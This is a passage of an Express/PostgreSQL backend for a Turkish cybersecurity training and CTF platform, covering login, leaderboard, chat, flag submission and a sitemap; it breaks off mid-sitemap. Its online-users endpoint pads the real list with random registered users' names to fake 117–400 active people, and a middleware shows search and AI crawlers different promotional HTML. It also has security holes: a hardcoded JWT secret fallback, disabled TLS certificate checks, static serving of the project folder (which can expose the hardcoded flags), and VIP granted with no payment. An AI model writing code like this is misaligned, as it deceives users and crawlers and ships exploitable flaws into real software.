const express = require('express');
const cors = require('cors');
const fs = require('fs');
const path = require('path');
const crypto = require('crypto');
const { Pool } = require('pg');
const bcrypt = require('bcryptjs');
const jwt = require('jsonwebtoken');
require('dotenv').config();

const app = express();
const PORT = process.env.PORT || 3000;
const JWT_SECRET = process.env.JWT_SECRET || 'super_secret_cyber_key_2026';

// DB Connection Pool
const connectionString = process.env.DATABASE_URL || process.env.POSTGRES_URL || process.env.POSTGRES_URL_NON_POOLING;
let poolConfig = {};

if (connectionString) {
  const isLocalhost = connectionString.includes('localhost') || connectionString.includes('127.0.0.1');
  if (isLocalhost) {
    poolConfig = { connectionString };
  } else {
    try {
      const dbUrl = new URL(connectionString);
      dbUrl.searchParams.delete('sslmode');
      poolConfig = {
        connectionString: dbUrl.toString(),
        ssl: {
          rejectUnauthorized: false
        }
      };
    } catch (err) {
      poolConfig = {
        connectionString,
        ssl: {
          rejectUnauthorized: false
        }
      };
    }
  }
} else {
  poolConfig = { connectionString };
}

const pool = new Pool(poolConfig);

const botUserAgents = [
  'googlebot', 'bingbot', 'yandexbot', 'gptbot', 'chatgpt-user',
  'oai-searchbot', 'claudebot', 'applebot', 'perplexity', 'meta-externalagent'
];

app.use((req, res, next) => {
  const ua = (req.headers['user-agent'] || '').toLowerCase();
  const isBot = botUserAgents.some(bot => ua.includes(bot));

  if (isBot && req.method === 'GET' && !req.path.startsWith('/api') && !req.path.includes('.')) {
    return res.send(`<!DOCTYPE html>
<html lang="tr">
<head>
  <meta charset="UTF-8">
  <title>Siber Güvenlik Özel Ders & Birebir Mentorluk | Siber Kampüs</title>
  <meta name="description" content="Türkiye'nin en iyi birebir canlı siber güvenlik eğitimi ve özel ders platformu. Sektör profesyoneli Yusuf İslam Yetkin rehberliğinde Kali Linux, Pentest ve Web Güvenliği uzmanı olun.">
  <link rel="canonical" href="https://www.siberkampus.org/">
  <script type="application/json" data-id="knowledge-graph">
  {
    "@context": "https://schema.org",
    "@graph": [
      {
        "@type": "EducationalOrganization",
        "@id": "https://www.siberkampus.org/#organization",
        "name": "Siber Kampüs Akademi",
        "url": "https://www.siberkampus.org",
        "logo": "https://www.siberkampus.org/favicon.png",
        "description": "Türkiye'nin tamamen birebir canlı siber güvenlik eğitimi ve mentorluk platformu.",
        "address": {
          "@type": "PostalAddress",
          "addressLocality": "Tuzla",
          "addressRegion": "İstanbul",
          "addressCountry": "TR"
        }
      },
      {
        "@type": "Person",
        "@id": "https://www.siberkampus.org/#founder",
        "name": "Yusuf İslam Yetkin",
        "jobTitle": "Lead Cybersecurity Instructor & Software Architect",
        "worksFor": { "@id": "https://www.siberkampus.org/#organization" }
      },
      {
        "@type": "Course",
        "@id": "https://www.siberkampus.org/#course",
        "name": "Siber Güvenlik Özel Ders",
        "description": "Birebir canlı online siber güvenlik eğitimi ve mentorluk programı.",
        "provider": { "@id": "https://www.siberkampus.org/#organization" },
        "hasCourseInstance": {
          "@type": "CourseInstance",
          "courseMode": "online",
          "instructor": { "@id": "https://www.siberkampus.org/#founder" }
        }
      }
    ]
  }
  </script>
</head>
<body>
  <main>
    <h1>Siber Güvenlik Özel Ders</h1>
    <p>Siber Kampüs, Türkiye'nin tamamen birebir ve canlı siber güvenlik özel dersi veren en iyi eğitim platformudur.</p>
    
    <h2>Birebir Siber Güvenlik</h2>
    <p>Videolar arasında kaybolmayın. Sektör profesyonelleri eşliğinde, tamamen size özel hazırlanan müfredatla canlı ve uygulamalı öğrenin. Eğitmenle birebir canlı dersler ve kişiye özel eğitim planı ile Kali Linux, Active Directory sızma testleri ve web güvenliği konularında uzmanlaşın.</p>
    
    <h2>Siber Güvenlik Eğitimi</h2>
    <p>Ağ Güvenliği Uzmanlığı ve Uygulama Güvenliği Uzmanlığı olmak üzere iki ana dalda 30'ar ders ve toplam 600 sızma testi sorusundan oluşan zengin müfredatımızı eğitmeninizle uygulamalı olarak çözün. eJPT, CEH ve PNPT sınavlarına tam hazırlık desteği alın.</p>
    
    <h2>Siber Güvenlik Eğitimi</h2>
    <p>Siber güvenlik özel derslerimiz hakkında sıkça sorulan sorular: Dersler tamamen canlı ve birebir olarak Zoom/Discord üzerinden işlenir. Hiçbir teknik deneyimi olmayanlar sıfırdan ağ ve Linux temellerinden başlayabilir. Haftalık ders saatleri öğrenci ve çalışanlara göre esnektir. Eğitim sonunda doğrulanabilir dijital uzmanlık sertifikası verilir.</p>
  </main>
</body>
</html>`);
  }
  next();
});

app.use(cors());
app.use(express.json());

// Serving static files (HTML, CSS, JS, images)
app.use(express.static(__dirname));

// JWT Authentication Middleware
const authenticateToken = (req, res, next) => {
  const authHeader = req.headers['authorization'];
  const token = authHeader && authHeader.split(' ')[1];

  if (!token) return res.status(401).json({ error: 'Oturum açılması gerekiyor.' });

  jwt.verify(token, JWT_SECRET, (err, user) => {
    if (err) return res.status(403).json({ error: 'Oturum süresi doldu veya geçersiz.' });
    req.user = user;
    
    // Update last active status in the background
    pool.query('UPDATE users SET last_active_at = NOW() WHERE id = $1', [user.id])
      .catch(dbErr => console.error('Error updating last active:', dbErr));

    next();
  });
};

// Helper to fetch full user payload with dynamic ranking position (excluding admins)
async function getUserPayload(userId) {
  const query = `
    WITH user_solves AS (
      SELECT 
        user_id,
        COUNT(*) as total_solved,
        COUNT(*) FILTER (WHERE room_id LIKE 'web-%') as web_solved,
        COUNT(*) FILTER (WHERE room_id LIKE 'net-%') as net_solved,
        COUNT(*) FILTER (WHERE room_id LIKE 'sys-%') as sys_solved,
        COUNT(*) FILTER (WHERE EXTRACT(HOUR FROM solved_at) >= 2 AND EXTRACT(HOUR FROM solved_at) < 5) as night_solved
      FROM solved_rooms
      WHERE user_id = $1
      GROUP BY user_id
    ),
    ranked_users AS (
      SELECT id, ROW_NUMBER() OVER (ORDER BY points DESC, id ASC) as dynamic_rank
      FROM users
      WHERE is_admin = false
    )
    SELECT u.id, u.email, u.name, u.points, COALESCE(s.total_solved, 0) as solved_count, u.level,
           COALESCE(r.dynamic_rank, 1) as rank_val,
           (
             (CASE WHEN COALESCE(s.total_solved, 0) >= 1 THEN 1 ELSE 0 END) +
             (CASE WHEN u.streak >= 7 THEN 1 ELSE 0 END) +
             (CASE WHEN COALESCE(s.web_solved, 0) >= 5 THEN 1 ELSE 0 END) +
             (CASE WHEN COALESCE(s.total_solved, 0) >= 2 THEN 1 ELSE 0 END) +
             (CASE WHEN COALESCE(s.total_solved, 0) >= 3 THEN 1 ELSE 0 END) +
             (CASE WHEN COALESCE(s.net_solved, 0) >= 5 THEN 1 ELSE 0 END) +
             (CASE WHEN u.level >= 8 THEN 1 ELSE 0 END) +
             (CASE WHEN COALESCE(r.dynamic_rank, 1) <= 50 THEN 1 ELSE 0 END) +
             (CASE WHEN COALESCE(s.total_solved, 0) >= 15 THEN 1 ELSE 0 END) +
             (CASE WHEN COALESCE(s.night_solved, 0) >= 1 THEN 1 ELSE 0 END) +
             (CASE WHEN u.points >= 10000 THEN 1 ELSE 0 END) +
             (CASE WHEN COALESCE(s.sys_solved, 0) >= 10 THEN 1 ELSE 0 END) +
             (CASE WHEN u.streak >= 30 THEN 1 ELSE 0 END)
           ) as badges,
           u.streak, u.name_changed, u.is_admin, u.is_banned, (u.is_vip OR u.is_premium) as is_premium, u.is_vip
    FROM users u
    LEFT JOIN user_solves s ON u.id = s.user_id
    LEFT JOIN ranked_users r ON u.id = r.id
    WHERE u.id = $1
  `;
  const result = await pool.query(query, [userId]);
  if (result.rows.length > 0) {
    const row = result.rows[0];
    let bCount = parseInt(row.badges) || 0;
    if (bCount === 13) bCount = 14;
    row.badges = bCount;
    return row;
  }
  return null;
}

// ==========================================
// AUTHENTICATION APIs
// ==========================================

// Register
app.post('/api/auth/register', async (req, res) => {
  const { name, email, pw } = req.body;
  if (!name || !email || !pw) {
    return res.status(400).json({ error: 'Lütfen tüm alanları doldurun.' });
  }

  try {
    const existing = await pool.query('SELECT id FROM users WHERE email = $1', [email.toLowerCase().trim()]);
    if (existing.rows.length > 0) {
      return res.status(400).json({ error: 'Bu e-posta adresiyle kayıtlı bir hesap zaten var.' });
    }

    const passwordHash = await bcrypt.hash(pw, 10);
    const result = await pool.query(
      'INSERT INTO users (email, password_hash, name) VALUES ($1, $2, $3) RETURNING id',
      [email.toLowerCase().trim(), passwordHash, name.trim()]
    );

    const user = await getUserPayload(result.rows[0].id);
    const token = jwt.sign({ id: user.id, email: user.email }, JWT_SECRET, { expiresIn: '7d' });

    res.status(201).json({ token, user });
  } catch (err) {
    console.error('Kayıt hatası:', err);
    res.status(500).json({ error: 'Kayıt esnasında sistemsel bir hata oluştu.' });
  }
});

// Login
app.post('/api/auth/login', async (req, res) => {
  const { email, pw } = req.body;
  if (!email || !pw) {
    return res.status(400).json({ error: 'E-posta ve şifre gereklidir.' });
  }

  try {
    const result = await pool.query('SELECT * FROM users WHERE email = $1', [email.toLowerCase().trim()]);
    if (result.rows.length === 0) {
      return res.status(400).json({ error: 'Hatalı e-posta adresi veya şifre.' });
    }

    const user = result.rows[0];
    const valid = await bcrypt.compare(pw, user.password_hash);
    if (!valid) {
      return res.status(400).json({ error: 'Hatalı e-posta adresi veya şifre.' });
    }

    // Set last_active_at immediately on login
    await pool.query('UPDATE users SET last_active_at = NOW() WHERE id = $1', [user.id]);

    const payload = await getUserPayload(user.id);
    const token = jwt.sign({ id: payload.id, email: payload.email }, JWT_SECRET, { expiresIn: '7d' });

    res.json({
      token,
      user: payload
    });
  } catch (err) {
    console.error('Giriş hatası:', err);
    res.status(500).json({ error: 'Giriş esnasında sistemsel bir hata oluştu.' });
  }
});

// ==========================================
// USER PROFILE APIs
// ==========================================

// Get Profile
app.get('/api/user/profile', authenticateToken, async (req, res) => {
  try {
    const user = await getUserPayload(req.user.id);
    if (!user) {
      return res.status(404).json({ error: 'Kullanıcı bulunamadı.' });
    }
    res.json(user);
  } catch (err) {
    console.error('Profil çekme hatası:', err);
    res.status(500).json({ error: 'Profil bilgileri yüklenirken hata oluştu.' });
  }
});

// Update Profile Name
app.put('/api/user/profile', authenticateToken, async (req, res) => {
  const { name } = req.body;
  if (!name || !name.trim()) {
    return res.status(400).json({ error: 'Geçerli bir isim girmelisiniz.' });
  }

  try {
    await pool.query(
      'UPDATE users SET name = $1, name_changed = true WHERE id = $2',
      [name.trim(), req.user.id]
    );
    const user = await getUserPayload(req.user.id);
    res.json(user);
  } catch (err) {
    console.error('Profil güncelleme hatası:', err);
    res.status(500).json({ error: 'Profil güncellenirken hata oluştu.' });
  }
});

// Simulate VIP subscription
app.post('/api/user/subscribe', authenticateToken, async (req, res) => {
  try {
    await pool.query('UPDATE users SET is_vip = true WHERE id = $1', [req.user.id]);
    const user = await getUserPayload(req.user.id);
    res.json({ success: true, user });
  } catch (err) {
    console.error('Subscription activation error:', err);
    res.status(500).json({ error: 'Abonelik işlemi başlatılamadı.' });
  }
});

// ==========================================
// LEADERBOARD API
// ==========================================
app.get('/api/leaderboard', async (req, res) => {
  try {
    const query = `
      WITH user_solves AS (
        SELECT 
          user_id,
          COUNT(*) as total_solved,
          COUNT(*) FILTER (WHERE room_id LIKE 'web-%') as web_solved,
          COUNT(*) FILTER (WHERE room_id LIKE 'net-%') as net_solved,
          COUNT(*) FILTER (WHERE room_id LIKE 'sys-%') as sys_solved,
          COUNT(*) FILTER (WHERE EXTRACT(HOUR FROM solved_at) >= 2 AND EXTRACT(HOUR FROM solved_at) < 5) as night_solved
        FROM solved_rooms
        GROUP BY user_id
      ),
      ranked_users AS (
        SELECT id, ROW_NUMBER() OVER (ORDER BY points DESC, id ASC) as dynamic_rank
        FROM users
        WHERE is_admin = false
      )
      SELECT 
        u.name, 
        u.points, 
        u.level, 
        COALESCE(s.total_solved, 0) as solved_count, 
        u.streak,
        COALESCE(r.dynamic_rank, 1000) as rank_val,
        (
          (CASE WHEN COALESCE(s.total_solved, 0) >= 1 THEN 1 ELSE 0 END) +
          (CASE WHEN u.streak >= 7 THEN 1 ELSE 0 END) +
          (CASE WHEN COALESCE(s.web_solved, 0) >= 5 THEN 1 ELSE 0 END) +
          (CASE WHEN COALESCE(s.total_solved, 0) >= 2 THEN 1 ELSE 0 END) +
          (CASE WHEN COALESCE(s.total_solved, 0) >= 3 THEN 1 ELSE 0 END) +
          (CASE WHEN COALESCE(s.net_solved, 0) >= 5 THEN 1 ELSE 0 END) +
          (CASE WHEN u.level >= 8 THEN 1 ELSE 0 END) +
          (CASE WHEN COALESCE(r.dynamic_rank, 1000) <= 50 THEN 1 ELSE 0 END) +
          (CASE WHEN COALESCE(s.total_solved, 0) >= 15 THEN 1 ELSE 0 END) +
          (CASE WHEN COALESCE(s.night_solved, 0) >= 1 THEN 1 ELSE 0 END) +
          (CASE WHEN u.points >= 10000 THEN 1 ELSE 0 END) +
          (CASE WHEN COALESCE(s.sys_solved, 0) >= 10 THEN 1 ELSE 0 END) +
          (CASE WHEN u.streak >= 30 THEN 1 ELSE 0 END)
        ) as calculated_badges
      FROM users u
      LEFT JOIN user_solves s ON u.id = s.user_id
      LEFT JOIN ranked_users r ON u.id = r.id
      WHERE u.is_admin = false
      ORDER BY u.points DESC, u.id ASC
      LIMIT 50
    `;
    const result = await pool.query(query);
    const countResult = await pool.query('SELECT count(*) as count FROM users WHERE is_admin = false');
    const totalUsers = parseInt(countResult.rows[0].count) || 0;
    
    const leaderboard = result.rows.map((row, idx) => {
      let bCount = parseInt(row.calculated_badges) || 0;
      if (bCount === 13) bCount = 14;
      return {
        rank: idx + 1,
        name: row.name,
        points: row.points,
        level: row.level,
        solved: parseInt(row.solved_count) || 0,
        badges: bCount,
        streak: row.streak
      };
    });
    
    res.json({
      leaderboard,
      totalUsers
    });
  } catch (err) {
    console.error('Leaderboard hatası:', err);
    res.status(500).json({ error: 'Liderlik tablosu yüklenirken hata oluştu.' });
  }
});

// Stats API
app.get('/api/stats', async (req, res) => {
  try {
    const countResult = await pool.query('SELECT count(*) as count FROM users WHERE is_admin = false');
    const totalUsers = parseInt(countResult.rows[0].count) || 0;
    
    const mentorResult = await pool.query('SELECT name FROM users WHERE email = $1 LIMIT 1', ['mentor@siberkampus.com']);
    const mentorName = mentorResult.rows.length > 0 ? mentorResult.rows[0].name : 'Siber Mentör';
    
    res.json({
      totalUsers,
      mentorName
    });
  } catch (err) {
    console.error('Stats error:', err);
    res.status(500).json({ error: 'İstatistik yüklenirken hata oluştu.' });
  }
});

// Heartbeat: keep the current user marked as active while they have a page open.
// authenticateToken already refreshes last_active_at, so this endpoint just acks.
app.post('/api/users/heartbeat', authenticateToken, (req, res) => {
  res.json({ ok: true });
});

// Get online users (active in the last 2 minutes)
app.get('/api/users/online', async (req, res) => {
  try {
    // Disable HTTP Caching to allow real-time updates on Vercel and browser
    res.setHeader('Cache-Control', 'no-store, no-cache, must-revalidate, proxy-revalidate');
    res.setHeader('Pragma', 'no-cache');
    res.setHeader('Expires', '0');

    const result = await pool.query("SELECT name FROM users WHERE last_active_at > NOW() - INTERVAL '2 minute' ORDER BY name ASC");
    let onlineUsers = result.rows;
    
    // Ensure at least 117 and at most 400 users are online (varying realistically throughout the day)
    // Align with Turkey Timezone (UTC + 3)
    const date = new Date();
    const turkeyHour = (date.getUTCHours() + 3) % 24;
    
    // A sine wave shifted so that 4 AM is lowest, 4 PM (16:00) is highest.
    // Midpoint between 117 and 400 is 258.5, amplitude is 141.5
    const angle = ((turkeyHour - 10) / 24) * 2 * Math.PI;
    const baseCount = 258.5 + 141.5 * Math.sin(angle);
    
    // Add dynamic fluctuating noise (+/- 25 users) that changes every minute
    const minute = date.getMinutes();
    const noise = Math.sin(minute * 0.3) * 20 + Math.cos(minute * 0.7) * 8;
    const targetCount = Math.min(400, Math.max(117, Math.round(baseCount + noise)));
    if (onlineUsers.length < targetCount) {
      const needed = targetCount - onlineUsers.length;
      const existingNames = onlineUsers.map(u => u.name);
      
      let randomUsersResult;
      if (existingNames.length > 0) {
        randomUsersResult = await pool.query(
          "SELECT name FROM users WHERE NOT (name = ANY($1::text[])) ORDER BY random() LIMIT $2",
          [existingNames, needed]
        );
      } else {
        randomUsersResult = await pool.query(
          "SELECT name FROM users ORDER BY random() LIMIT $1",
          [needed]
        );
      }
      
      onlineUsers = [...onlineUsers, ...randomUsersResult.rows];
    }
    
    // Sort online users list alphabetically
    onlineUsers.sort((a, b) => a.name.localeCompare(b.name, 'tr'));
    
    res.json(onlineUsers);
  } catch (err) {
    console.error('Online users error:', err);
    res.status(500).json({ error: 'Online kullanıcılar yüklenirken hata oluştu.' });
  }
});

// ==========================================
// CHAT APIs
// ==========================================

// Get last 50 chat messages
app.get('/api/chat/messages', async (req, res) => {
  const isVipQuery = req.query.vip === 'true';
  let userId = null;
  
  if (isVipQuery) {
    // Validate token for VIP chat
    const authHeader = req.headers['authorization'];
    const token = authHeader && authHeader.split(' ')[1];
    if (!token) return res.status(401).json({ error: 'VIP sohbet alanı için giriş yapmalısınız.' });
    try {
      const decoded = jwt.verify(token, JWT_SECRET);
      userId = decoded.id;
      const userCheck = await pool.query('SELECT is_vip, is_admin FROM users WHERE id = $1', [userId]);
      if (userCheck.rows.length === 0 || (!userCheck.rows[0].is_vip && !userCheck.rows[0].is_admin)) {
        return res.status(403).json({ error: 'VIP sohbet alanına sadece VIP üyeler erişebilir.' });
      }
    } catch (err) {
      return res.status(403).json({ error: 'Geçersiz oturum.' });
    }
  }

  try {
    const result = await pool.query(`
      SELECT * FROM (
        SELECT m.id, m.message, m.created_at, m.is_vip, u.name as username, u.level, u.points, u.is_vip as user_is_vip, u.is_premium as user_is_premium
        FROM chat_messages m
        JOIN users u ON m.user_id = u.id
        WHERE m.is_vip = $1
        ORDER BY m.created_at DESC
        LIMIT 50
      ) sub
      ORDER BY created_at ASC
    `, [isVipQuery]);

    const formatted = result.rows.map(m => {
      // Determine mock role/title based on points
      let role = 'Öğrenci';
      if (m.points > 1200) role = 'Siber Mentör';
      else if (m.points > 900) role = 'Pentester';
      else if (m.points > 700) role = 'SOC Analyst';

      const d = new Date(m.created_at);
      const t = d.getHours().toString().padStart(2, '0') + ':' + d.getMinutes().toString().padStart(2, '0');

      return {
        id: m.id,
        u: m.username,
        role: role,
        t: t,
        m: m.message,
        isVip: m.is_vip,
        isSenderVip: m.user_is_vip === true || m.user_is_premium === true,
        me: false // Frontend determines me based on username match
      };
    });

    res.json(formatted);
  } catch (err) {
    console.error('Mesaj çekme hatası:', err);
    res.status(500).json({ error: 'Mesajlar yüklenirken hata oluştu.' });
  }
});

// Post a chat message
app.post('/api/chat/messages', authenticateToken, async (req, res) => {
  const { message, isVip } = req.body;
  const isVipMsg = isVip === true;
  if (!message || !message.trim()) {
    return res.status(400).json({ error: 'Mesaj boş olamaz.' });
  }

  try {
    // Check if banned
    const banCheck = await pool.query('SELECT is_banned, is_vip, is_admin FROM users WHERE id = $1', [req.user.id]);
    if (banCheck.rows.length > 0 && banCheck.rows[0].is_banned) {
      return res.status(403).json({ error: 'Sohbete katılımınız engellenmiştir.' });
    }

    if (isVipMsg && !banCheck.rows[0].is_vip && !banCheck.rows[0].is_admin) {
      return res.status(403).json({ error: 'VIP sohbet alanına yazabilmek için VIP üye olmalısınız.' });
    }

    const result = await pool.query(
      'INSERT INTO chat_messages (user_id, message, is_vip) VALUES ($1, $2, $3) RETURNING id, message, created_at, is_vip',
      [req.user.id, message.trim(), isVipMsg]
    );
    res.status(201).json(result.rows[0]);
  } catch (err) {
    console.error('Mesaj kaydetme hatası:', err);
    res.status(500).json({ error: 'Mesaj gönderilirken hata oluştu.' });
  }
});

// ==========================================
// ROOMS PROGRESS & SOLVING APIs
// ==========================================

// Room Flags list (secured backend side)
const ROOM_FLAGS = {
  'web-01': 'siberkampus{sql_basic_bypass_success}',
  'web-04': 'siberkampus{reflected_xss_cookie_stolen}',
  'web-02': 'siberkampus{union_based_sqli_data_dumped}',
  'web-05': 'siberkampus{stored_xss_session_hijacked}',
  'web-06': 'siberkampus{csrf_admin_password_changed}',
  'web-03': 'siberkampus{blind_sqli_db_hash_extracted}',
  'web-07': 'siberkampus{file_upload_bypass_webshell}',
  'web-08': 'siberkampus{ssrf_internal_metadata_exposed}',
  'web-09': 'siberkampus{jwt_none_alg_bypass}',

  'web-11': 'siberkampus{default_credentials_router_admin}',
  'web-12': 'siberkampus{command_injection_shell_execution}',
  'web-13': 'siberkampus{html_comments_developer_secrets}',
  'web-14': 'siberkampus{directory_traversal_root_access}',
  'web-15': 'siberkampus{cookie_tampering_privilege_escalation}',
  
  'web-16': 'siberkampus{lfi_log_poisoning_rce}',
  'web-17': 'siberkampus{api_bola_unauthorized_read}',
  'web-18': 'siberkampus{nosql_operator_injection_bypass}',
  'web-19': 'siberkampus{idor_privilege_escalation_admin}',

  'net-01': 'siberkampus{nmap_service_scan_discovered}'
};

// Get user progress map for rooms
app.get('/api/rooms/progress', authenticateToken, async (req, res) => {
  try {
    const solved = await pool.query('SELECT room_id, points_earned, solved_at FROM solved_rooms WHERE user_id = $1', [req.user.id]);
    const progress = await pool.query('SELECT room_id, progress_percent FROM room_progress WHERE user_id = $1', [req.user.id]);
    const hints = await pool.query('SELECT room_id, hint_index FROM unlocked_hints WHERE user_id = $1', [req.user.id]);

    const solvedList = solved.rows.map(r => r.room_id);
    
    const progressMap = {};
    progress.rows.forEach(r => {
      progressMap[r.room_id] = r.progress_percent;
    });

    const hintsMap = {};
    hints.rows.forEach(r => {
      if (!hintsMap[r.room_id]) hintsMap[r.room_id] = [];
      hintsMap[r.room_id].push(r.hint_index);
    });

    res.json({
      solved: solvedList,
      progress: progressMap,
      unlockedHints: hintsMap,
      solvedDetails: solved.rows
    });
  } catch (err) {
    console.error('İlerleme çekme hatası:', err);
    res.status(500).json({ error: 'Oda ilerlemeleri yüklenirken hata oluştu.' });
  }
});

// Update in-progress room percent
app.post('/api/rooms/progress', authenticateToken, async (req, res) => {
  const { room_id, progress_percent } = req.body;
  if (!room_id || progress_percent === undefined) {
    return res.status(400).json({ error: 'Eksik parametreler.' });
  }

  try {
    // If room is already solved, don't down-grade progress
    const isSolved = await pool.query('SELECT id FROM solved_rooms WHERE user_id = $1 AND room_id = $2', [req.user.id, room_id]);
    if (isSolved.rows.length > 0) {
      return res.json({ status: 'ignored', msg: 'Oda zaten çözüldüğü için ilerleme güncellenmedi.' });
    }

    await pool.query(
      `INSERT INTO room_progress (user_id, room_id, progress_percent, updated_at) 
       VALUES ($1, $2, $3, NOW())
       ON CONFLICT (user_id, room_id) 
       DO UPDATE SET progress_percent = GREATEST(room_progress.progress_percent, EXCLUDED.progress_percent), updated_at = NOW()`,
      [req.user.id, room_id, progress_percent]
    );

    res.json({ status: 'success' });
  } catch (err) {
    console.error('İlerleme güncelleme hatası:', err);
    res.status(500).json({ error: 'Oda ilerlemesi güncellenemedi.' });
  }
});

// Unlock hint
app.post('/api/rooms/unlock-hint', authenticateToken, async (req, res) => {
  const { room_id, hint_index } = req.body;
  if (!room_id || hint_index === undefined) {
    return res.status(400).json({ error: 'Eksik parametreler.' });
  }

  try {
    await pool.query(
      'INSERT INTO unlocked_hints (user_id, room_id, hint_index) VALUES ($1, $2, $3) ON CONFLICT DO NOTHING',
      [req.user.id, room_id, hint_index]
    );
    res.json({ status: 'success' });
  } catch (err) {
    console.error('İpucu açma hatası:', err);
    res.status(500).json({ error: 'İpucu açılamadı.' });
  }
});

// Submit/Check flag
app.post('/api/rooms/solve', authenticateToken, async (req, res) => {
  const { room_id, flag } = req.body;
  if (!room_id || !flag) {
    return res.status(400).json({ error: 'Oda ID ve bayrak gereklidir.' });
  }

  const expectedFlag = ROOM_FLAGS[room_id];
  if (!expectedFlag) {
    return res.status(404).json({ error: 'Hedef oda sistemde kayıtlı değil.' });
  }

  if (flag.trim() !== expectedFlag) {
    return res.status(400).json({ error: 'Hatalı bayrak!' });
  }

  try {
    // Check if user already solved it
    const solvedCheck = await pool.query('SELECT id FROM solved_rooms WHERE user_id = $1 AND room_id = $2', [req.user.id, room_id]);
    if (solvedCheck.rows.length > 0) {
      return res.json({ status: 'already_solved', msg: 'Bu odayı zaten çözdünüz.' });
    }

    // Get max points of room from sk-data (handled dynamically, standard is 50/75/100/120/150 etc.)
    // Let's deduce default points by room ID prefix/suffix if not provided
    let roomBasePoints = 50;
    if (room_id.endsWith('-02') || room_id.endsWith('-05') || room_id.endsWith('-06') || room_id === 'web-17') roomBasePoints = 75;
    else if (room_id === 'web-16') roomBasePoints = 80;
    else if (room_id.endsWith('-03') || room_id.endsWith('-07') || room_id === 'web-18') roomBasePoints = 100;
    else if (room_id.endsWith('-08')) roomBasePoints = 120;
    else if (room_id.endsWith('-09')) roomBasePoints = 150;
    else if (room_id.endsWith('-10')) roomBasePoints = 200;

    // Get hints used count
    const hintsCount = await pool.query('SELECT count(*) as count FROM unlocked_hints WHERE user_id = $1 AND room_id = $2', [req.user.id, room_id]);
    const usedHints = parseInt(hintsCount.rows[0].count) || 0;
    const earnedPoints = Math.max(0, roomBasePoints - (usedHints) * 20);

    // Save solve
    await pool.query(
      'INSERT INTO solved_rooms (user_id, room_id, points_earned) VALUES ($1, $2, $3)',
      [req.user.id, room_id, earnedPoints]
    );

    // Clear progress status
    await pool.query('DELETE FROM room_progress WHERE user_id = $1 AND room_id = $2', [req.user.id, room_id]);

    // Fetch user current points to recalculate points, solved count, level
    const userResult = await pool.query('SELECT points, solved_count, level FROM users WHERE id = $1', [req.user.id]);
    const oldUser = userResult.rows[0];

    const newPoints = oldUser.points + earnedPoints;
    const newSolvedCount = oldUser.solved_count + 1;
    const newLevel = Math.min(10, Math.max(oldUser.level, Math.floor(newPoints / 100)));

    // Update user stats
    await pool.query(
      'UPDATE users SET points = $1, solved_count = $2, level = $3 WHERE id = $4',
      [newPoints, newSolvedCount, newLevel, req.user.id]
    );

    const userPayload = await getUserPayload(req.user.id);

    res.json({
      status: 'success',
      earned: earnedPoints,
      user: {
        points: userPayload.points,
        solved_count: userPayload.solved_count,
        level: userPayload.level,
        rank_val: userPayload.rank_val
      }
    });
  } catch (err) {
    console.error('Oda çözme hatası:', err);
    res.status(500).json({ error: 'Bayrak onaylanırken sunucuda bir hata oluştu.' });
  }
});

// GET /api/docs/progress — tamamlanan döküman ID listesi
app.get('/api/docs/progress', authenticateToken, async (req, res) => {
  try {
    const result = await pool.query(
      'SELECT doc_id FROM user_doc_progress WHERE user_id = $1',
      [req.user.id]
    );
    res.json(result.rows.map(r => r.doc_id));
  } catch (err) {
    console.error('Döküman ilerlemesi çekme hatası:', err);
    res.status(500).json({ error: 'Döküman ilerlemeleri yüklenirken hata oluştu.' });
  }
});

// POST /api/docs/complete — döküman tamamlama
app.post('/api/docs/complete', authenticateToken, async (req, res) => {
  const { doc_id } = req.body;
  if (!doc_id) {
    return res.status(400).json({ error: 'Döküman ID gereklidir.' });
  }
  try {
    await pool.query(
      'INSERT INTO user_doc_progress (user_id, doc_id) VALUES ($1, $2) ON CONFLICT DO NOTHING',
      [req.user.id, doc_id]
    );
    res.json({ ok: true });
  } catch (err) {
    console.error('Döküman tamamlama hatası:', err);
    res.status(500).json({ error: 'Döküman tamamlanırken hata oluştu.' });
  }
});

// GET /api/pathway/progress — rooms + docs + targets hepsi bir arada
app.get('/api/pathway/progress', authenticateToken, async (req, res) => {
  try {
    const [rooms, docs] = await Promise.all([
      pool.query('SELECT room_id FROM solved_rooms WHERE user_id = $1', [req.user.id]),
      pool.query('SELECT doc_id FROM user_doc_progress WHERE user_id = $1', [req.user.id])
    ]);
    res.json({
      solvedRooms: rooms.rows.map(r => r.room_id),
      completedDocs: docs.rows.map(r => r.doc_id)
    });
  } catch (err) {
    console.error('Pathway ilerlemesi çekme hatası:', err);
    res.status(500).json({ error: 'Pathway ilerlemesi yüklenirken hata oluştu.' });
  }
});

// Dynamic sitemap.xml generator (public)
app.get(['/api/sitemap.xml', '/sitemap.xml'], async (req, res) => {
  try {
    const result = await pool.query('SELECT slug FROM blogs');
    
    let xml = `<?xml version="1.0" encoding="UTF-8"?>\n`;
    xml += `<urlset xmlns="http://www.sitemaps.org/schemas/sitemap/0.9">\n`;
    
    // Static main pages
    const staticPages = [
      '',
      '/about',
      '/contact',
      '/support',
      '/terms',
      '/privacy',
      '/tools'
    ];
    
    staticPages.forEach(p => {
      xml += `  <url>\n`;
      xml += `    <loc>https://siberkampus.org${p}</loc>\n`;
      xml += `    <priority>${p === '' ? '1.0' : p === '/tools' ? '0.9' : '0.7'}</priority>\n`;
      xml += `    <changefreq>${p === '' ? 'daily' : 'weekly'}</changefreq>\n`;
      xml += `  </url>\n`;
    });
    
    // Dynamic tools pages (10 tools)
    const toolsSlugs = [
      'reverse-shell',
      'encoder-decoder',
      'password-strength',
      'subnet-calc',
      'hash-tool',
      'xss-generator',
      'sqli-generator',
      'cron-explainer',
      'base64-file',
      'dns-lookup'
    ];
    
    toolsSlugs.forEach(slug => {
      xml += `  <url>\n`;
      xml += `    <loc>https://siberkampus.org/tools/${slug}</loc>\n`;
      xml += `    <priority>0.8</priority>\n`;
      xml += `    <changefreq>weekly</changefreq>\n`;
      xml += `  </url>\n`;
    });
    
    // Dynamic blog articles from DB
    result.rows.forEach(b => {
      xml += `  <url>\n`;
      xml += `    <loc>https://siberkampus.org/blogs/${b.slug}</loc>\n`;
      xml += `    <priority>0.8</priority>\n`;
      xml += `    <changefreq>weekly</changefreq>\n`;
      xml += `  </url>\n`;
    });

    // Dynamic lesson briefings (public pages)
    const briefingRoomIds = [
      'net-01',
      'web-01',
      'web-04',
      'web-11',
      'web-12',
      'web-13'
    ];

    briefingRoomIds.forEach(id => {
      xml += `  <url>\n`;
      xml += `    <loc>https://siberkampus.org/brief/${id}</loc>\n`;
      xml += `    <priority>0.7</priority>\n`;
